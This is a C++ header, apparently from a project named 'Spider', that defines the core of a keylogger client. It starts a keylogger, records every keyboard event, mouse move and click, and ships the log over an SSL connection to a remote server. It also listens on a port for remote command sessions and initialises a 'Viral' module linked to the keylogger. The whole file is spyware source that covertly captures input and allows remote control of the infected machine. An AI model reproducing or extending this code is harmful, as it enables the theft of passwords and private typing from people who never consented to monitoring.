//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_CSPIDERCORE_HPP
#define SPIDER_CLIENT_CSPIDERCORE_HPP

#include <Network/SSLConnection.hpp>
#include <Network/ClientSession.hpp>
#include <Network/TCPAcceptor.hpp>
#include <Protocol/CommandHandler.hpp>
#include <KeyLogger/KeyLogger.hpp>
#include <KeyLogger/KeyLoggerFactory.hpp>
#include <Viral/Viral.hpp>
#include <Logging/LogHandle.hpp>
#include <Core/ServerCommandSession.hpp>

namespace spi
{
    class CSpiderCore
    {
    public:
        CSpiderCore() = default;

        ~CSpiderCore()
        {
            _log(lg::Info) << "Shutting down..." << std::endl;
            _keyLogger->stop();
            delete _sess;
        }

        bool run()
        {
            __setupSigHandlers();
            __setup();
            __startAcceptor();
            _log(lg::Info) << "Starting..." << std::endl;
            _keyLogger->run();
            _clientSession->onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection,
                                                  this, net::ErrorPlaceholder));
            _clientSession->connect();
            _sess->setup(&_viral);
            _io.run();
            return true;
        }

        void stop()
        {
            _io.stop();
        }

    private:
        void __setupSigHandlers()
        {
            _io.onTerminationSignals(boost::bind(&CSpiderCore::stop, this));
        }

        void __setupLogHandleConnection(net::SSLConnection *sslConnection)
        {
            _logHandle.connect(sslConnection);
        }

        void __handleAccept(const ErrorCode &ec)
        {
            if (!ec) {
                _sess->onError(boost::bind(&CSpiderCore::__removeSession, this, _1));
                _sess->startSession();
            } else {
                _log(lg::Level::Warning) << "Unable to accept a command connection: " << ec.message() << std::endl;
                __startAcceptor();
            }
        }

        void __removeSession([[maybe_unused]] CommandableSession *s)
        {
            delete _sess;
            __startAcceptor();
        }

        void __startAcceptor()
        {
            _sess = new ServerCommandSession(_io, _ctx);
            _acc.onAccept(_sess->connection(), boost::bind(&CSpiderCore::__handleAccept, this, net::ErrorPlaceholder));
        }

        void __setup()
        {
            _acc.bind(cfg::portAcceptor);
            _logHandle.setup();
            _keyLogger->setup();
            _viral.setup(_keyLogger.get());

            _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event) {
                _logHandle.appendEntry(event);
            });
            _keyLogger->onMouseClickEvent([this](proto::MouseClick &&event) {
                _logHandle.appendEntry(event);
            });
            _keyLogger->onKeyboardEvent([this](proto::KeyEvent &&event) {
                _logHandle.appendEntry(event);
            });
        }

    private:
        net::IOManager _io;
        spi::net::SSLContext _ctx{spi::net::SSLContext::SSLv23};

        std::unique_ptr<ClientSession> _clientSession{std::make_unique<ClientSession>(_ctx, _io)};

        net::TCPAcceptor _acc{_io};
        ServerCommandSession *_sess{nullptr};

        LogHandle _logHandle;

        Viral _viral{};

        KeyLogPtr _keyLogger{Factory::createKeyLogger(_io)};

        lg::Logger _log{"client-spider", lg::Level::Debug};
    };
}

#endif //SPIDER_CLIENT_CSPIDERCORE_HPP
